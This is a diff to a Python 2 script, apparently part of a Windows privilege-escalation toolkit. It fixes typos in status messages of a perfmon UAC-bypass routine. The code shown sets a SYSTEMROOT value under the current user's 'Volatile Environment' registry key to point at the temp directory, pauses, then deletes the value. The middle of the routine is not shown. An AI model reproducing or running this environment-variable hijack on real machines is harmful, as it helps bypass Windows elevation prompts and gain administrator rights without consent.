@@ -25,20 +25,20 @@ def warningBox():
 	return (Fore.YELLOW + '[!]' + Fore.RESET)
 
 def perfmon():
-	print " {} perfmon: Attempting to change %SYTEMROOT% through volatile environment".format(infoBox())
+	print " {} perfmon: Attempting to change %SYSTEMROOT% through volatile environment".format(infoBox())
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
 					os.path.join("Volatile Environment"))
-								
+							
 		_winreg.SetValueEx(key,
 				"SYSTEMROOT",
 				0,
 				_winreg.REG_SZ,
 				tempfile.gettempdir())
 		_winreg.CloseKey(key)
-		print " {} perfmon: Registry %SYTEMROOT% key was created".format(successBox())
+		print " {} perfmon: Registry %SYSTEMROOT% key was created".format(successBox())
 	except Exception as error:
-		print " {} perfmon: Unable to create %SYTEMROOT% key".format(errorBox())
+		print " {} perfmon: Unable to create %SYSTEMROOT% key".format(errorBox())
 		return False
 
 	try:
@@ -99,14 +99,15 @@ def perfmon():
 	print " {} perfmon: Pausing for 5 seconds before cleaning".format(infoBox())	
 	time.sleep(5)
 
-	print " {} perfmon: Attempting to remove %SYTEMROOT% registry key".format(infoBox())
+	print " {} perfmon: Attempting to remove %SYSTEMROOT% registry key".format(infoBox())
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
 					os.path.join("Volatile Environment"))
 		_winreg.DeleteValue(key,
 				"SYSTEMROOT")
-		print " {} perfmon: %SYTEMROOT% registry key was deleted".format(successBox())
+		print " {} perfmon: %SYSTEMROOT% registry key was deleted".format(successBox())
 	except Exception as error:
-		print " {} perfmon: Unable to delete %SYTEMROOT% registry key".format(errorBox())
+		print " {} perfmon: Unable to delete %SYSTEMROOT% registry key".format(errorBox())
 		return False
-perfmon()		
+
+perfmon()
